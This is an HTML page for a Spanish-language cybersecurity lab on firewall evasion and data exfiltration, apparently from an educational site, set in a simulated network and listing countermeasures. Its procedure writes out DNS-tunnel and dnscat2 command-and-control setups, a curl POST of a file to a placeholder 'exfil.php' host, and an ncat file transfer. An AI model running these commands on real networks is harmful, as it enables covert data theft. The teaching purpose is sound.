@@ -1,1 +1,285 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 13 – Evasión de firewalls y exfiltración de datos</title>
+  <link rel="icon" href="/el-pergamino-digital/assets/favicon.png" type="image/png" />
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #121212;
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+    }
+    nav {
+      background-color: #1f1f1f;
+      padding: 1em;
+      text-align: center;
+    }
+    nav a {
+      color: #e0e0e0;
+      margin: 0 1em;
+      text-decoration: none;
+    }
+    nav a.activo {
+      font-weight: bold;
+      text-decoration: underline;
+    }
+    h1 {
+      text-align: center;
+      margin-top: 1.5em;
+      color: #ffffff;
+    }
+    .subtitulo {
+      text-align: center;
+      color: #bbbbbb;
+      margin-bottom: 2em;
+    }
+    main {
+      max-width: 900px;
+      margin: auto;
+      padding: 2em;
+    }
+    section {
+      margin-bottom: 2em;
+    }
+    h2 {
+      color: #90caf9;
+    }
+    code {
+      background-color: #1e1e1e;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+    footer {
+      text-align: center;
+      padding: 2em;
+      background-color: #1e1e1e;
+      font-size: 0.9em;
+      color: #aaaaaa;
+    }
+    @media (max-width: 600px) {
+      body { font-size: 1.1em; }
+      h1 { font-size: 1.8em; }
+      .subtitulo { font-size: 1.1em; }
+      nav a { display: block; margin: 0.5em 0; }
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <a href="/el-pergamino-digital/index.html">Inicio</a>
+    <a href="/el-pergamino-digital/labs/" class="activo">Laboratorios</a>
+    <a href="/el-pergamino-digital/glosario/">Glosario</a>
+    <a href="/el-pergamino-digital/simulador/">Simulador</a>
+    <a href="/el-pergamino-digital/modulos/">Módulos</a>
+  </nav>
 
+  <h1>Lab 13 – Evasión de firewalls y exfiltración de datos</h1>
+  <p class="subtitulo">Simulación de técnicas para eludir controles de red y extraer información sin ser detectado</p>
+
+  <main>
+    <section>
+      <h2>Objetivo</h2>
+      <p>Explorar técnicas ofensivas para evadir firewalls y mecanismos de inspección de tráfico, y simular la exfiltración de datos mediante canales encubiertos y protocolos alternativos.</p>
+    </section>
+
+    <section>
+      <h2>Alcance y limitaciones</h2>
+      <p><strong>Alcance:</strong> Simulación de bypass de firewalls, uso de DNS tunneling, HTTP covert channels, y técnicas de fragmentación o cifrado para evadir detección.</p>
+      <p><strong>Limitaciones:</strong> No se extraen datos reales ni se comprometen sistemas externos. El laboratorio se ejecuta en entornos virtuales controlados.</p>
+      <p><strong>Escenario sugerido:</strong> Red simulada con firewall básico, máquina atacante (Kali), máquina víctima (Linux o Windows), y servidor externo de recepción.</p>
+    </section>
+
+    <section>
+      <h2>Requisitos previos</h2>
+      <ul>
+        <li>Conocimientos de protocolos de red, firewalls y detección de intrusos</li>
+        <li>Familiaridad con herramientas de tunneling, cifrado y análisis de tráfico</li>
+        <li>Entorno: Kali Linux, máquina víctima, servidor externo (VPS o emulado)</li>
+        <li>Herramientas instaladas: <code>iodine</code>, <code>dnscat2</code>, <code>ncat</code>, <code>curl</code>, <code>tcpdump</code>, <code>Wireshark</code></li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Arquitectura del entorno</h2>
+      <pre>
+[ Kali (192.168.1.10) ]
+        ↓
+[ Firewall / IDS simulado ]
+        ↓
+[ Servidor externo (VPS o emulado) ]
+      </pre>
+      <p>El atacante intenta evadir el firewall para exfiltrar datos desde la red interna hacia el servidor externo.</p>
+    </section>
+
+    <section>
+      <h2>Herramientas y entorno técnico</h2>
+      <ul>
+        <li><strong>iodine</strong>: túnel IP sobre DNS</li>
+        <li><strong>dnscat2</strong>: canal de comando y control sobre DNS</li>
+        <li><strong>ncat</strong>: transferencia de archivos por TCP/UDP</li>
+        <li><strong>curl</strong>: exfiltración simulada por HTTP/HTTPS</li>
+        <li><strong>tcpdump / Wireshark</strong>: análisis de tráfico y detección de patrones</li>
+      </ul>
+    </section>
+
+        <section>
+      <h2>Procedimiento técnico paso a paso</h2>
+      <ol>
+        <li>Establecer túnel DNS con <code>iodine</code>:
+          <pre><code>iodined -f 10.0.0.1 tunnel.dominio.com</code> (servidor)
+iodine -f tunnel.dominio.com (cliente)</code></pre>
+        </li>
+        <li>Probar canal de comando con <code>dnscat2</code>:
+          <pre><code>ruby ./dnscat2.rb</code> (servidor)
+./dnscat --dns server_ip</code></pre>
+        </li>
+        <li>Simular exfiltración con <code>curl</code>:
+          <pre><code>curl -X POST -d @archivo.txt http://servidor/exfil.php</code></pre>
+        </li>
+        <li>Transferir archivo con <code>ncat</code>:
+          <pre><code>ncat -l -p 4444 > recibido.txt (servidor)
+ncat servidor_ip 4444 < archivo.txt (cliente)</code></pre>
+        </li>
+        <li>Capturar tráfico con <code>tcpdump</code> o <code>Wireshark</code> para analizar patrones</li>
+        <li>Comparar visibilidad de cada técnica frente a firewall o IDS simulado</li>
+      </ol>
+    </section>
+
+    <section>
+      <h2>Resultados esperados</h2>
+      <ul>
+        <li>Establecimiento de túneles DNS funcionales</li>
+        <li>Exfiltración simulada de archivos por HTTP o TCP</li>
+        <li>Captura de tráfico para análisis forense</li>
+        <li>Evaluación de evasión frente a reglas de firewall o IDS</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Análisis de resultados</h2>
+      <p>Las técnicas de exfiltración se basan en el uso de canales alternativos o disfrazados para evadir controles perimetrales. El uso de DNS, HTTP, o puertos no monitoreados permite al atacante extraer información sin activar alertas. La detección depende de la granularidad del monitoreo y la capacidad de inspección profunda.</p>
+    </section>
+
+    <section>
+      <h2>Medidas</h2>
+      <ul>
+        <li>Documentar cada técnica utilizada y su visibilidad</li>
+        <li>Comparar eficacia de evasión entre métodos</li>
+        <li>Registrar patrones de tráfico y firmas detectables</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Contramedidas</h2>
+      <ul>
+        <li>Implementar inspección profunda de paquetes (DPI)</li>
+        <li>Restringir tráfico DNS saliente a servidores autorizados</li>
+        <li>Monitorear tráfico HTTP con encabezados y payloads anómalos</li>
+        <li>Aplicar reglas de firewall basadas en comportamiento</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Riesgos y advertencias</h2>
+      <p>La exfiltración de datos es una de las fases más críticas de un ataque. Este laboratorio debe realizarse exclusivamente en entornos de laboratorio. El uso de estas técnicas en redes reales sin autorización puede constituir una violación grave de leyes y políticas de seguridad.</p>
+    </section>
+
+    <section>
+      <h2>Evidencias</h2>
+      <p><em>Espacio reservado para capturas de pantalla de túneles DNS, sesiones de dnscat2, tráfico HTTP, y análisis en Wireshark.</em></p>
+    </section>
+
+    <section>
+      <h2>Validación cruzada</h2>
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1048/" target="_blank">MITRE ATT&CK T1048 – Exfiltration Over Alternative Protocol</a></li>
+        <li><a href="https://attack.mitre.org/techniques/T1071/" target="_blank">MITRE ATT&CK T1071 – Application Layer Protocol</a></li>
+        <li><a href="https://www.cisecurity.org/controls/13" target="_blank">CIS Control 13 – Data Protection</a></li>
+      </ul>
+    </section>
+
+      <section>
+      <h2>Referencias normativas y técnicas</h2>
+      <ul>
+        <li><a href="https://attack.mitre.org/techniques/T1048/" target="_blank">MITRE ATT&CK T1048 – Exfiltration Over Alternative Protocol</a></li>
+        <li><a href="https://attack.mitre.org/techniques/T1071/" target="_blank">MITRE ATT&CK T1071 – Application Layer Protocol</a></li>
+        <li><a href="https://www.cisecurity.org/controls/13" target="_blank">CIS Control 13 – Data Protection</a></li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Certificaciones asociadas</h2>
+      <ul>
+        <li>OSCP – Data Exfiltration and Network Evasion</li>
+        <li>eCPPT – Firewall Bypass and Covert Channels</li>
+        <li>CompTIA PenTest+ – Domain 3.0: Attacks and Exploits</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Analogía técnica</h2>
+      <p style="font-family: 'Comic Sans MS'; font-size: 12pt;">
+        Exfiltrar datos sin ser detectado es como sacar documentos secretos por una tubería de desagüe: nadie lo nota si no sabe dónde mirar.
+      </p>
+    </section>
+
+    <section>
+      <h2>Nivel de dificultad</h2>
+      <p>Avanzado</p>
+    </section>
+
+    <section>
+      <h2>Checklist final</h2>
+      <ul>
+        <li>[ ] Túneles DNS y HTTP configurados</li>
+        <li>[ ] Exfiltración simulada completada</li>
+        <li>[ ] Tráfico capturado y analizado</li>
+        <li>[ ] Técnicas comparadas por visibilidad</li>
+        <li>[ ] Validación cruzada registrada</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Navegación transversal</h2>
+      <ul>
+        <li><a href="/el-pergamino-digital/index.html">Portada</a></li>
+        <li><a href="/el-pergamino-digital/glosario/">Glosario</a></li>
+        <li><a href="/el-pergamino-digital/simulador/">Simulador</a></li>
+        <li><a href="/el-pergamino-digital/modulos/">Módulos</a></li>
+        <li><a href="/el-pergamino-digital/labs/">Laboratorios</a></li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>Reflexión estratégica</h2>
+      <p>La exfiltración es la fase final de muchos ataques dirigidos. Comprender cómo se ocultan los datos en tránsito permite anticipar rutas de fuga y diseñar defensas más inteligentes. Este laboratorio entrena la mente ofensiva para fortalecer la postura defensiva.</p>
+    </section>
+
+    <section>
+      <h2>Disclaimer de advertencia</h2>
+      <p><strong>Advertencia:</strong> Este laboratorio está diseñado exclusivamente para fines educativos y debe ejecutarse en entornos controlados. La aplicación de estas técnicas en redes reales sin autorización puede constituir una violación legal grave. El Pergamino Digital no se responsabiliza por el uso indebido de las técnicas aquí descritas.</p>
+    </section>
+  </main>
+
+  <footer>
+    <p>Este laboratorio forma parte del proyecto <a href="https://pergamino-digital-ciberseguridad.blogspot.com/?m=1" target="_blank">El Pergamino Digital</a>, alineado con estándares internacionales y diseñado para fortalecer competencias técnicas en ciberseguridad.</p>
+  </footer>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const links = document.querySelectorAll("nav a");
+      links.forEach(link => {
+        if (link.href === window.location.href) {
+          link.classList.add("activo");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
